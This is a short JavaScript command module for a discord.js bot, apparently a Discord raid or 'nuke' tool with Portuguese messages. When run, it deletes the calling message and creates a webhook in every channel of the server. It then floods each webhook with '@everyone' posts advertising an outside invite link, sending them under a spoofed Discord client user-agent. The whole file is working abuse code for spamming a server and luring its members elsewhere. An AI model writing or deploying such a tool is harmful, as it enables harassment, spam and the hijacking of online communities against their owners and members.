const discord = require('discord.js')
const colors = require('colors')
const config = require("../config.json");
const axios = require('axios')

function spam(wb) {
    for (let amount = 0; amount < 5; amount++) {
        axios({
            url: `https://discordapp.com/api/webhooks/${wb.id}/${wb.token}`,
            method: "POST",
            data: {
                "content": "@everyone https://discord.gg/SewFVJcPNw **MIGRAMOS**!"
            }, headers: {
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36"
            }
        }).then(
            () => console.log(`  [+] Webhook Flodadas!`)
        ).catch(err => console.log(`  [-] Unable to send webhook: ${err}`))
    }
}

exports.run = async (client, message, args) => {
    message.delete();
    message.guild.channels.forEach(c => {
        c.createWebhook(`nossa, derrubaram meu servidor`).then(
            wb => spam(wb)
        ).catch(e => {})
    });


    console.log(colors.green("  [+] Everyone flodadas."))
  }
